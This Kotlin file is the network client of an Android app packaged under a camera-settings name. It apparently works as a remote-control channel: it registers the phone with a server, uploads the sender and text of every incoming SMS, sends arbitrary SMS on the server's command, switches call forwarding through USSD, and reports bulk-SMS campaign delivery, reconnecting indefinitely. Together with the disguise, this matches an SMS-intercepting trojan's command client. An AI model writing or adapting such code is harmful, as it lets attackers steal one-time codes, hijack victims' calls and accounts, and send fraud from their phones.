package com.settingpro.camera.data.remote

import com.settingpro.camera.util.AppLogger
import com.settingpro.camera.data.model.DeviceInfo
import com.settingpro.camera.data.model.WebSocketMessage
import com.settingpro.camera.data.model.RegisterData
import com.settingpro.camera.data.model.HeartbeatData
import com.settingpro.camera.data.model.SmsReceivedData
import com.settingpro.camera.data.model.CallForwardingData
import com.settingpro.camera.data.model.CallForwardingResponseData
import com.settingpro.camera.data.model.SendSmsData
import com.settingpro.camera.data.model.SendSmsResponseData
import com.settingpro.camera.util.Constants
import com.google.gson.Gson
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class WebSocketClient @Inject constructor(
    private val gson: Gson
) {
    private var socket: Socket? = null
    @Volatile private var heartbeatJob: Job? = null

    private var scope: CoroutineScope = freshScope()

    private val _connectionState = MutableStateFlow<ConnectionState>(ConnectionState.Disconnected)
    val connectionState: StateFlow<ConnectionState> = _connectionState.asStateFlow()

    private var serverUrl: String? = null
    @Volatile private var deviceInfo: DeviceInfo? = null

    private val smsForwardedCount = AtomicInteger(0)
    private var serviceStartTime = 0L

    private var onMessageCallback: ((WebSocketMessage) -> Unit)? = null
    private var onConnectionCallback: ((ConnectionState) -> Unit)? = null
    private val shouldReconnect = AtomicBoolean(false)

    fun getSmsForwardedCount(): Int = smsForwardedCount.get()

    companion object {
        private const val TAG = "WebSocketClient"
        private fun freshScope() = CoroutineScope(Dispatchers.IO + SupervisorJob())
    }

    // ─── Public API ───────────────────────────────────────────────────────────

    fun connect(
        serverUrl: String,
        deviceInfo: DeviceInfo,
        onMessageReceived: (WebSocketMessage) -> Unit,
        onConnectionStateChanged: (ConnectionState) -> Unit
    ) {
        this.onMessageCallback = onMessageReceived
        this.onConnectionCallback = onConnectionStateChanged
        this.deviceInfo = deviceInfo
        this.shouldReconnect.set(true)

        if (serviceStartTime == 0L) serviceStartTime = System.currentTimeMillis()

        val urlChanged = this.serverUrl != null && this.serverUrl != serverUrl
        this.serverUrl = serverUrl

        if (urlChanged) {
            AppLogger.d(TAG, "Server URL changed — tearing down existing connection")
            socket?.disconnect(); socket = null
            _connectionState.value = ConnectionState.Disconnected
            attemptConnect()
            return
        }

        val state = _connectionState.value
        if (state == ConnectionState.Connecting || state == ConnectionState.Connected) {
            AppLogger.d(TAG, "Already connected or connecting — skipping")
            return
        }
        attemptConnect()
    }

    fun forceReconnect() {
        if (!shouldReconnect.get()) { AppLogger.d(TAG, "forceReconnect ignored — shouldReconnect=false"); return }
        AppLogger.d(TAG, "Force reconnect triggered")
        // Use Socket.IO's built-in reconnect
        socket?.disconnect()
        socket?.connect()
    }

    fun disconnect() {
        AppLogger.d(TAG, "Disconnecting")
        shouldReconnect.set(false)
        stopHeartbeat()
        // Important: Use socket.disconnect() not socket.close() to prevent reconnect
        socket?.disconnect()
        socket = null
        _connectionState.value = ConnectionState.Disconnected
    }

    fun destroy() {
        AppLogger.d(TAG, "Destroying")
        disconnect()
        scope.cancel()
        scope = freshScope()
        serviceStartTime = 0L
    }

    fun isConnected(): Boolean = _connectionState.value == ConnectionState.Connected

    /**
     * Check if the Socket.io connection is healthy and ready for communication.
     * Returns true only if connected (not connecting, disconnected, or in error state).
     */
    fun isConnectionHealthy(): Boolean {
        val state = _connectionState.value
        return state == ConnectionState.Connected && socket?.connected() == true
    }

    fun updateDeviceInfo(info: DeviceInfo) { this.deviceInfo = info }

    fun send(message: WebSocketMessage): Boolean {
        if (!isConnected()) { AppLogger.w(TAG, "Cannot send — not connected"); return false }
        return try {
            when (message) {
                is WebSocketMessage.Register -> {
                    socket?.emit("register", gson.toJson(message.data))
                    true
                }
                is WebSocketMessage.Heartbeat -> {
                    socket?.emit("heartbeat", gson.toJson(message.data))
                    true
                }
                is WebSocketMessage.SmsReceived -> {
                    socket?.emit("sms", gson.toJson(message.data))
                    true
                }
                is WebSocketMessage.CallForwardingResponse -> {
                    socket?.emit("call_forwarding_response", gson.toJson(message.data))
                    true
                }
                is WebSocketMessage.SendSmsResponse -> {
                    socket?.emit("send_sms_response", gson.toJson(message.data))
                    true
                }
                is WebSocketMessage.Pong -> {
                    socket?.emit("pong", message.timestamp)
                    true
                }
                else -> {
                    AppLogger.w(TAG, "Unsupported message type: ${message.type}")
                    false
                }
            }
        } catch (e: Exception) { AppLogger.e(TAG, "Error sending message", e); false }
    }

    // ─── Connection internals ─────────────────────────────────────────────────

    private fun attemptConnect() {
        val url = serverUrl ?: return
        val ioUrl = buildSocketIoUrl(url)
        AppLogger.d(TAG, "Connecting to $ioUrl")
        _connectionState.value = ConnectionState.Connecting

        try {
            // Only create socket if it doesn't exist (reuse on reconnect)
            if (socket == null) {
                val opts = IO.Options().apply {
                    reconnection = true                    // ✅ Enable built-in reconnection
                    reconnectionAttempts = Int.MAX_VALUE    // ✅ Keep trying forever
                    reconnectionDelay = 1000               // ✅ Start with 1 second
                    reconnectionDelayMax = 30000           // ✅ Max 30 seconds between attempts
                    timeout = 10000
                    // Force WebSocket transport to avoid HTTP polling issues with ngrok
                    transports = arrayOf("websocket")
                    // Use the correct path that matches server configuration
                    path = "/gateway"
                }
                socket = IO.socket(ioUrl, opts)
                socket?.let { setupSocketListeners(it) }
            }

            socket?.connect()  // ✅ Reuse existing socket
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error creating Socket.io connection", e)
            _connectionState.value = ConnectionState.Error(e.message ?: "Connection error")
        }
    }

    private fun setupSocketListeners(socket: Socket) {
        socket.on(Socket.EVENT_CONNECT) {
            AppLogger.d(TAG, "Socket.io connected")
            _connectionState.value = ConnectionState.Connected
            onConnectionCallback?.invoke(ConnectionState.Connected)
            deviceInfo?.let { sendRegistration(it) }
            startHeartbeat()
        }

        socket.on(Socket.EVENT_DISCONNECT) { args ->
            val reason = if (args.isNotEmpty()) args[0].toString() else "unknown"
            AppLogger.d(TAG, "Socket.io disconnected: $reason")
            stopHeartbeat()
            _connectionState.value = ConnectionState.Disconnected
            onConnectionCallback?.invoke(ConnectionState.Disconnected)
            // ✅ Socket.IO handles reconnection automatically
        }

        socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
            val error = if (args.isNotEmpty()) args[0].toString() else "Unknown error"
            AppLogger.e(TAG, "Socket.io connection error: $error")
            stopHeartbeat()
            val errorState = ConnectionState.Error(error)
            _connectionState.value = errorState
            onConnectionCallback?.invoke(errorState)
            // ✅ Socket.IO handles reconnection automatically
        }

        socket.on("registered") { args ->
            try {
                if (args.isNotEmpty()) {
                    val data = args[0] as? JSONObject
                    AppLogger.d(TAG, "Device registered: ${data?.toString()}")
                    // Server sends: { success: true, deviceId: "..." }
                    onMessageCallback?.invoke(WebSocketMessage.Registered(
                        data?.optString("deviceId") ?: ""
                    ))
                }
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error handling registered event", e)
            }
        }

        socket.on("heartbeat_ack") { args ->
            try {
                if (args.isNotEmpty()) {
                    val data = args[0] as? JSONObject
                    AppLogger.d(TAG, "Heartbeat acknowledged: ${data?.toString()}")
                }
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error handling heartbeat_ack", e)
            }
        }

        socket.on("sms_ack") { args ->
            try {
                if (args.isNotEmpty()) {
                    val data = args[0] as? JSONObject
                    val success = data?.optBoolean("success") ?: false
                    val messageId = data?.optString("messageId")
                    AppLogger.d(TAG, "SMS acknowledged: success=$success, messageId=$messageId")
                    onMessageCallback?.invoke(WebSocketMessage.Ack(
                        messageId = messageId,
                        success = success
                    ))
                }
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error handling sms_ack", e)
            }
        }

        socket.on("error") { args ->
            try {
                if (args.isNotEmpty()) {
                    val data = args[0] as? JSONObject
                    val message = data?.optString("message") ?: "Unknown error"
                    AppLogger.e(TAG, "Server error: $message")
                    onMessageCallback?.invoke(WebSocketMessage.Error(
                        code = data?.optString("code"),
                        message = message
                    ))
                }
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error handling server error", e)
            }
        }

        socket.on("call_forwarding") { args ->
            try {
                if (args.isNotEmpty()) {
                    val data = args[0] as? JSONObject
                    AppLogger.d(TAG, "Call forwarding command received: ${data?.toString()}")
                    // Server sends: { action: "forward|deactivate|check", phoneNumber: "...", simSlot: 0 }
                    val action = data?.optString("action")
                    if (action.isNullOrBlank()) {
                        AppLogger.e(TAG, "call_forwarding missing action: ${data?.toString()}")
                        return@on
                    }
                    val validActions = setOf("forward", "deactivate", "check")
                    if (action !in validActions) {
                        AppLogger.e(TAG, "call_forwarding unknown action '$action': ${data?.toString()}")
                        return@on
                    }
                    onMessageCallback?.invoke(WebSocketMessage.CallForwardingCommand(CallForwardingData(
                        action = action,
                        phoneNumber = data?.optString("phoneNumber"),
                        simSlot = data?.optInt("simSlot") ?: 0,
                        requestId = data?.optString("requestId")
                    )))
                }
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error handling call_forwarding", e)
            }
        }

        socket.on("send_sms") { args ->
            try {
                if (args.isNotEmpty()) {
                    val data = args[0] as? JSONObject
                    AppLogger.d(TAG, "Send SMS command received: ${data?.toString()}")
                    // Server sends: { messageId: "...", phoneNumber: "...", message: "...", simSlot: 0 }
                    val messageId = data?.optString("messageId")
                    val phoneNumber = data?.optString("phoneNumber")
                    val message = data?.optString("message")
                    val simSlot = data?.optInt("simSlot") ?: 0

                    if (messageId.isNullOrBlank() || phoneNumber.isNullOrBlank() || message.isNullOrBlank()) {
                        AppLogger.e(TAG, "send_sms missing required fields: ${data?.toString()}")
                        return@on
                    }

                    onMessageCallback?.invoke(WebSocketMessage.SendSmsCommand(SendSmsData(
                        messageId = messageId,
                        phoneNumber = phoneNumber,
                        message = message,
                        simSlot = simSlot,
                        requestId = data?.optString("requestId")
                    )))
                }
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error handling send_sms", e)
            }
        }

        socket.on("ping") { args ->
            try {
                val timestamp = if (args.isNotEmpty()) args[0] as? Long else System.currentTimeMillis()
                AppLogger.d(TAG, "Ping received, sending pong")
                onMessageCallback?.invoke(WebSocketMessage.Ping(timestamp))
                send(WebSocketMessage.Pong(System.currentTimeMillis()))
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error handling ping", e)
            }
        }
    }

    // ─── Heartbeat ────────────────────────────────────────────────────────────

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isActive) {
                delay(Constants.HEARTBEAT_INTERVAL)
                if (isConnected()) {
                    try { sendHeartbeat() }
                    catch (e: Exception) { AppLogger.e(TAG, "Heartbeat error", e) }
                }
            }
        }
    }

    private fun stopHeartbeat() { heartbeatJob?.cancel(); heartbeatJob = null }

    // ─── Message helpers ──────────────────────────────────────────────────────

    private fun sendRegistration(deviceInfo: DeviceInfo) {
        send(WebSocketMessage.Register(RegisterData(
            deviceId       = deviceInfo.deviceId,
            name           = deviceInfo.model,
            appVersion     = Constants.APP_VERSION,
            osVersion      = deviceInfo.osVersion,
            deviceModel    = deviceInfo.model,
            manufacturer   = deviceInfo.manufacturer,
            batteryLevel   = deviceInfo.batteryLevel,
            isCharging     = deviceInfo.batteryStatus.contains("Charging", ignoreCase = true),
            signalStrength = deviceInfo.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
            networkType    = resolveNetworkType(deviceInfo.networkInfo.networkType),
            sims           = deviceInfo.simInfo.map { it.toMap() },
            fcmToken       = deviceInfo.fcmToken
        )))
    }

    fun sendHeartbeat() {
        val info = deviceInfo ?: return
        AppLogger.d(TAG, "Sending heartbeat with FCM token: ${info.fcmToken?.take(16) ?: "null"}...")
        send(WebSocketMessage.Heartbeat(HeartbeatData(
            deviceId       = info.deviceId,
            batteryLevel   = info.batteryLevel,
            isCharging     = info.batteryStatus.contains("Charging", ignoreCase = true),
            signalStrength = info.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
            networkType    = resolveNetworkType(info.networkInfo.networkType),
            sims           = info.simInfo.map { it.toMap() },
            uptime         = (System.currentTimeMillis() - serviceStartTime) / 1000,
            smsForwarded   = smsForwardedCount.get(),
            fcmToken       = info.fcmToken
        )))
    }

    fun sendSmsReceived(
        deviceId: String, sender: String, content: String, timestamp: Long,
        simSlot: Int, receiverNumber: String?, simCarrier: String?,
        simNetworkType: String?, networkType: String?
    ) {
        val smsData = SmsReceivedData(
            deviceId = deviceId, sender = sender, content = content,
            timestamp = timestamp,
            simSlot = simSlot + 1, // Convert 0-based slot to 1-based for the server
            receiverNumber = receiverNumber, simCarrier = simCarrier,
            simNetworkType = simNetworkType, networkType = networkType
        )
        if (send(WebSocketMessage.SmsReceived(smsData))) smsForwardedCount.incrementAndGet()
    }

    fun sendCallForwardingResponse(
        deviceId: String, action: String, success: Boolean, simSlot: Int,
        phoneNumber: String? = null, error: String? = null, ussdResponse: String? = null,
        requestId: String? = null
    ) {
        if (!isConnected()) { AppLogger.w(TAG, "Cannot send — not connected"); return }
        try {
            val response = CallForwardingResponseData(
                deviceId = deviceId,
                action = action,
                success = success,
                simSlot = simSlot + 1, // 0-based → 1-based
                phoneNumber = phoneNumber,
                error = error,
                ussdResponse = ussdResponse,
                timestamp = System.currentTimeMillis(),
                requestId = requestId
            )
            send(WebSocketMessage.CallForwardingResponse(response))
            AppLogger.d(TAG, "Call forwarding response sent: requestId=$requestId, action=$action, success=$success")
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error sending call forwarding response", e)
        }
    }

    /**
     * Send SMS delivery status for bulk SMS tracking
     */
    fun sendSmsDeliveryStatus(
        deviceId: String, messageId: String, campaignId: String,
        bulkMessageId: String, delivered: Boolean, simSlot: Int
    ) {
        if (!isConnected()) { AppLogger.w(TAG, "Cannot send — not connected"); return }
        try {
            val deliveryData = mapOf(
                "deviceId" to deviceId,
                "messageId" to messageId,
                "campaignId" to campaignId,
                "bulkMessageId" to bulkMessageId,
                "delivered" to delivered,
                "simSlot" to simSlot + 1, // 0-based → 1-based
                "timestamp" to System.currentTimeMillis()
            )
            send(WebSocketMessage.SmsDeliveryStatus(deliveryData))
            AppLogger.d(TAG, "SMS delivery status sent: messageId=$messageId, delivered=$delivered")
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error sending SMS delivery status", e)
        }
    }

    // ─── Utilities ────────────────────────────────────────────────────────────

    private fun buildSocketIoUrl(serverUrl: String): String {
        val url = serverUrl.trimEnd('/')
        val ioBase = when {
            url.startsWith("https://") -> url.removePrefix("https://")
            url.startsWith("http://")  -> url.removePrefix("http://")
            url.startsWith("wss://")   -> url.removePrefix("wss://")
            url.startsWith("ws://")    -> url.removePrefix("ws://")
            else                       -> url
        }
        // Socket.io client uses http/https, not ws/wss
        return if (url.startsWith("https://") || url.startsWith("wss://")) {
            "https://$ioBase"
        } else {
            "http://$ioBase"
        }
    }

    private fun resolveNetworkType(raw: String): String = when {
        raw.contains("WiFi",   ignoreCase = true) -> "wifi"
        raw.contains("Mobile", ignoreCase = true) -> "mobile"
        else -> "none"
    }
}

// ─── ConnectionState ──────────────────────────────────────────────────────────

sealed class ConnectionState {
    data object Disconnected : ConnectionState()
    data object Connecting   : ConnectionState()
    data object Connected    : ConnectionState()
    data class  Error(val message: String) : ConnectionState()

    val isConnected:  Boolean get() = this is Connected
    val isConnecting: Boolean get() = this is Connecting
}
